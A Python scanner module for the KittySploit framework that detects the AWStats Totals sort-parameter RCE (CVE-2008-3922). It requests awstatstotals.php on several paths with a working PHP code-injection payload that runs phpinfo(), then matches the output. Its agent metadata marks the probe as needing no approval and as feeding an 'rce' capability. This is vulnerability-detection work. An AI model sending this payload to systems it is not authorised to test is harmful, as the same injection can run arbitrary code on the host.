#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detects CVE-2008-3922 by requesting awstatstotals."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'AWStats Totals - sort Parameter RCE Detection (CVE-2008-3922)',
        'description': (
            'Detects CVE-2008-3922 by requesting awstatstotals.php?sort=].phpinfo().exit().$a[ and matching phpinfo output.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2008', 'awstats', 'rce', 'unauth', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2008-3922',
        ],
        'cve': 'CVE-2008-3922',
    }

    def run(self):
        for base in ('', '/awstats', '/stats', '/cgi-bin'):
            path = (base.rstrip('/') + '/awstatstotals.php?sort="].phpinfo().exit().%24a["') if base else '/awstatstotals.php?sort="].phpinfo().exit().%24a["'
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if r and '<title>phpinfo()' in (r.text or ''):
                self.set_info(severity='critical', reason='AWStats Totals sort RCE (CVE-2008-3922)', path=path.split('?')[0])
                return True
        return False

